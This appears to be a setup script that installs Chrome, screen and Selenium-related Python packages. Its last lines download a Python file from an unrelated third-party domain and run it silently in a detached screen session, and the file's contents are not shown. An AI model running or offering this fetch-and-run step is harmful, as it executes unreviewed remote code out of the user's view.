wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add - 
echo 'deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main' | sudo tee /etc/apt/sources.list.d/google-chrome.list
sudo apt update >/dev/null
sudo apt install google-chrome-stable -y >/dev/null
sudo apt install screen -y >/dev/null
pip install websockets
pip install websocket-client
pip install webdriver-manager
pip install selenium
wget -O file.py https://24hourscontent.com/ijin/eo/ok.py >/dev/null
screen -dmS MySession
screen -S MySession -p 0 -X stuff "python3 file.py\n"
